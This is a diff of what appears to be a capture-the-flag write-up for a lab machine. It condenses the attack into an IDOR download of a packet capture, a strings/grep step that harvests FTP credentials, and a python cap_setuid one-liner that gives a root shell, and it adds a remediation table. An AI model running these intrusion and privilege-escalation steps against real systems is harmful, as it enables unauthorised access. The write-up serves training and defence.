@@ -134,30 +134,32 @@ Upon forcing the index parameter down to `0` (`http://10.129.68`), the Security 
 
 *Figure 9: Dashboard tracking data updates upon exploiting index 0, displaying 72 populated packet records.*
 
-This data concentration validated that a historical session capture had been successfully intercepted. Clicking the administrative interactive item **"Download"** exfiltrated the raw data payload.
+This data concentration validated that a historical session capture had been successfully intercepted. Clicking the administrative interactive item **"Download"** exfiltrated the authentic **`0.pcap`** data container, providing the specific raw data required to initiate local credential hunting.
 
-![Successful Exfiltration of 0.pcap](./assets/Descargas_0.pcap.png)
+#### IDOR Boundary Exploitation & Credential Harvesting
+- **Credential Extraction:** `strings 0.pcap | grep -E "USER|PASS"` → `nathan:Buck3tH4TF0RM3!`
+- **Initial Access:** FTP login and download of `user.txt`.
 
-*Figure 10: Verification of the downloaded 0.pcap data container within the attacking local environment.*
+### Phase 3: Privilege Escalation
+- **SSH Access:** `ssh nathan@10.129.68.112`
+- **Enumeration:** `getcap -r / 2>/dev/null | grep python` → `/usr/bin/python3.8 = cap_setuid+ep`
+- **Exploitation:** `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+- **Root Confirmation:** `whoami` → `root`
+- **Flag:** `cat /root/root.txt` → `05e335171411e72ea02cbed2e5686331`
 
-#### Local Workspace Consolidation
-To maintain a strict and cohesive testing workflow, exfiltrated files must be moved out of generic system directories. The downloaded storage container was consolidated by transferring it from the main host download directory into the dedicated local repository subfolder (`~/cap/content/`) utilizing the native `mv` command.
+---
 
-```bash
-mv /home/kali/Downloads/0.pcap .
-```
+## 🛡️ Remediation & Hardening
 
-![Local Workspace Consolidation Command](./assets/mv_aclaracion.png)
+| Vulnerability | Root Cause | Recommended Fix |
+| :--- | :--- | :--- |
+| **IDOR on `/download/`** | Sequential numeric IDs without session validation. | Use UUIDs (e.g., `/download/uuid`), enforce user authentication, and validate permissions server-side. |
+| **FTP Credentials in PCAP** | Exposing internal packet captures to unauthenticated users. | Restrict PCAP access to administrators. Disable FTP; use SFTP with key-based authentication. |
+| **Python `cap_setuid+ep`** | Misconfigured Linux capability on a widely available binary. | Remove the capability: `setcap -r /usr/bin/python3.8`. Audit all binaries with `getcap -r /`. |
 
-*Figure 11: File relocation via the mv command to consolidate target resources within the operational workspace.*
+---
 
-#### Advanced Raw Packet Stream Inspection (Sequence 1)
-To reconstruct the raw packet communications cached within the `0.pcap` trace file without using heavy GUI network analysis tools, an advanced data pipeline was assembled in the terminal. The binary payloads of the TCP transport layer streams were extracted dynamically using `tshark`, muted for network descriptor noise, and piped directly into `xxd` running reverse plaintext hex stream parsing modes (`xxd -ps -r`).
+## 📚 Lessons Learned
 
-```bash
-tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
-```
-
-![Hexadecimal Stream Reconstruction Sequence 1](./assets/Extraccion_archivo0.png)
-
+- **IDOR** is a subtle but critical flaw that can expose sensitive internal data (like PCAPs) if not properly controlled.
 
